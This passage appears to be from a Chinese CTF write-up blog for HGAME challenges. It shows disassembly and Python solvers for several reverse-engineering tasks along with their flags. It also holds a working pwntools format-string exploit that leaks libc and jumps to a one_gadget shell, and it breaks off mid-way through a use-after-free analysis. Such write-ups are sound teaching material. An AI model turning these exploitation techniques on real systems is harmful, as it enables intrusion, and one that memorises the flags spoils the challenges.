class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; void __cdecl enc(char *p)</span><br><span class="line">.text:00401160 _enc            proc near               ; CODE XREF: _main+1B↑p</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160 i               = dword ptr -4</span><br><span class="line">.text:00401160 Str             = dword ptr  8</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160                 push    ebp</span><br><span class="line">.text:00401161                 mov     ebp, esp</span><br><span class="line">.text:00401163                 push    ecx</span><br><span class="line">.text:00401164                 mov     [ebp+i], 0</span><br><span class="line">.text:0040116B                 jmp     short loc_401176</span><br><span class="line">.text:0040116D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040116D</span><br><span class="line">.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3B↓ji自增</span><br><span class="line">.text:0040116D                 mov     eax, [ebp+i]</span><br><span class="line">.text:00401170                 add     eax, 1</span><br><span class="line">.text:00401173                 mov     [ebp+i], eax</span><br><span class="line">.text:00401176</span><br><span class="line">.text:00401176 loc_401176:                             ; CODE XREF: _enc+B↑j</span><br><span class="line">.text:00401176                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401179                 push    ecx             ; Str</span><br><span class="line">.text:0040117A                 call    _strlen; 返回Str的长度至eax</span><br><span class="line">.text:0040117F                 add     esp, 4</span><br><span class="line">.text:00401182                 cmp     [ebp+i], eax; i与len(Str)比较</span><br><span class="line">.text:00401185                 jge     short loc_40119D; 大则跳出循环</span><br><span class="line">.text:00401187                 mov     edx, [ebp+Str]</span><br><span class="line">.text:0040118A                 add     edx, [ebp+i]</span><br><span class="line">.text:0040118D                 movsx   eax, byte ptr [edx]; movsx 带符号扩展传送</span><br><span class="line">.text:00401190                 xor     eax, 33h; 异或加密</span><br><span class="line">.text:00401193                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401196                 add     ecx, [ebp+i]</span><br><span class="line">.text:00401199                 mov     [ecx], al</span><br><span class="line">.text:0040119B                 jmp     short loc_40116D</span><br><span class="line">.text:0040119D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040119D</span><br><span class="line">.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25↑j</span><br><span class="line">.text:0040119D                 mov     esp, ebp</span><br><span class="line">.text:0040119F                 pop     ebp</span><br><span class="line">.text:004011A0                 retn</span><br><span class="line">.text:004011A0 _enc            endp</span><br><span class="line">Input: your flag</span><br><span class="line">Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e</span><br></pre></td></tr></table></figure><p><code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x33</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;welc0me_t0_re_wor1d!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><p>简单的加密手法，找到<code>you are right</code>简单分析即可，如果不是<code>exe</code>文件的话还想试试<code>angr</code>一把梭：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">10</span>]; <span class="comment">// [rsp+20h] [rbp-19h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+48h] [rbp+Fh]</span></span><br><span class="line">  __int128 v10[<span class="number">3</span>]; <span class="comment">// [rsp+50h] [rbp+17h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+80h] [rbp+47h]</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">0</span>] = <span class="number">0x9FDFF04</span>;</span><br><span class="line">  v8[<span class="number">1</span>] = <span class="number">0xB0F301</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v8[<span class="number">2</span>] = <span class="number">0xADF00500</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  v3 = <span class="number">0</span>i64;</span><br><span class="line">  v8[<span class="number">3</span>] = <span class="number">0x5170607</span>;</span><br><span class="line">  v8[<span class="number">4</span>] = <span class="number">0x17FD17EB</span>;</span><br><span class="line">  v8[<span class="number">5</span>] = <span class="number">0x1EE01EA</span>;</span><br><span class="line">  v8[<span class="number">6</span>] = <span class="number">0xFA05B1EA</span>;</span><br><span class="line">  v8[<span class="number">7</span>] = <span class="number">0xAC170108</span>;</span><br><span class="line">  v8[<span class="number">8</span>] = <span class="number">0xFDEA01EC</span>;</span><br><span class="line">  v8[<span class="number">9</span>] = <span class="number">0x60705F0</span>;</span><br><span class="line">  v9 = <span class="number">0xF9</span>;</span><br><span class="line">  sub_140001064(<span class="string">&quot;%50s&quot;</span>, v10);</span><br><span class="line">  v4 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v4;</span><br><span class="line">  <span class="keyword">while</span> ( *(v10 + v4) );</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">41</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (*(v10 + v3) ^ <span class="number">0x32</span>) - <span class="number">86</span>;</span><br><span class="line">    *(v10 + v3) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( *(v8 + v3) != v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="string">&quot;you are right!&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">  sub_140001010(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0xFD</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF3</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>,</span><br><span class="line">      <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x17</span>, <span class="number">0x05</span>,</span><br><span class="line">      <span class="number">0xEB</span>, <span class="number">0x17</span>, <span class="number">0xFD</span>, <span class="number">0x17</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>, <span class="number">0x01</span>,</span><br><span class="line">      <span class="number">0xEA</span>, <span class="number">0xB1</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x17</span>, <span class="number">0xAC</span>,</span><br><span class="line">      <span class="number">0xEC</span>, <span class="number">0x01</span>, <span class="number">0xEA</span>, <span class="number">0xFD</span>, <span class="number">0xF0</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x06</span>,</span><br><span class="line">      <span class="number">0xF9</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((i+<span class="number">86</span>)%<span class="number">256</span>)^<span class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;</span></span><br></pre></td></tr></table></figure><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><p>将一个数分开二次加密记录，一个计算<code>%16</code>的余数，另一个计算<code>/16</code>的整数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+0h] [ebp-1CCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">52</span>]; <span class="comment">// [esp+190h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+1C4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1C8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  sub_4011A0(<span class="string">&quot;%50s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">2</span> * i] = v5[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">    v4[<span class="number">2</span> * i + <span class="number">1</span>] = (v5[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">100</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != dword_403000[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401160(Format, v4[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401160(aYesYouAreRight, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">result=[<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    result[<span class="number">2</span>*i]=result[<span class="number">2</span>*i] &amp; <span class="number">0xf</span></span><br><span class="line">    result[<span class="number">2</span>*i+<span class="number">1</span>]=(result[<span class="number">2</span>*i+<span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span></span><br><span class="line">    flag[i]=result[<span class="number">2</span>*i]+result[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn"></a>pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><p>考察栈外的格式化漏洞，且<code>read</code>次数只有一次，说明一次只能修改一个指定地址。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/99040/18/33955/52628/63c4b592Fdf5a68c1/c4c2b5bfadb8f836.png" style="zoom: 67%;" /><ul><li>第一次需要用来泄露+返回，将<code>buf</code>充满，会通过<code>print_str</code>泄露出一个残留的栈地址：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140789/38/32753/51582/63c4b696F25308ff7/31bf55ae390a5057.png" style="zoom:67%;" /><ul><li>不要<code>n</code>，继续在<code>buf</code>上布置栈返回地址，使其返回到<code>_start</code>（返回<code>main</code>和<code>vuln</code>会报错），顺便泄露出<code>libc</code>。</li><li>由于<code>printf(str)</code>最稳妥的修改方法是一个地址中的<code>1字节+2字节</code>(<code>2+2</code>需要爆破)，因此不难想到劫持程序执行流为<code>one_gadget</code>，而返回地址<code>__libc_start_main+???</code>作为<code>libc</code>地址显然和<code>one_gadget</code>具有更好的相似性，在返回到<code>__libc_start_main+???</code>时可以观察到<code>rdx=0</code>和<code>r15=0</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><ul><li>不难想到用第二个<code>gadget</code>。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31352</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">256</span>)</span><br><span class="line">stack=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">8</span></span><br><span class="line">log.success(<span class="string">&quot;stack===&gt;&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(stack)*<span class="number">32</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%45$p%4418c%8$hn&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">m1=(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m2=one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget==&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">log.success(<span class="string">&quot;m1=&quot;</span>+<span class="built_in">hex</span>(m1)+<span class="string">&quot;;m2=&quot;</span>+<span class="built_in">hex</span>(m2))</span><br><span class="line">stack2=stack-<span class="number">224</span></span><br><span class="line">log.success(<span class="string">&quot;stack2==&quot;</span>+<span class="built_in">hex</span>(stack2))</span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,p64(stack2+<span class="number">2</span>)+p64(stack2))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>(m1)</span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>(m2-m1)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h3><p><code>libc2.31</code>下常规的<code>uaf</code>漏洞。</p><ul><li>add：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> size[<span class="number">7</span>]; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This page has been used.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( size[<span class="number">0</span>] &lt;= <span class="number">0xFF</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = v2;</span><br><span class="line">        notes[v0] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">        note_size[v2] = size[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Too big.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ *&amp;size[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>delete中出现<code>uaf</code>漏洞：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">delete_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span 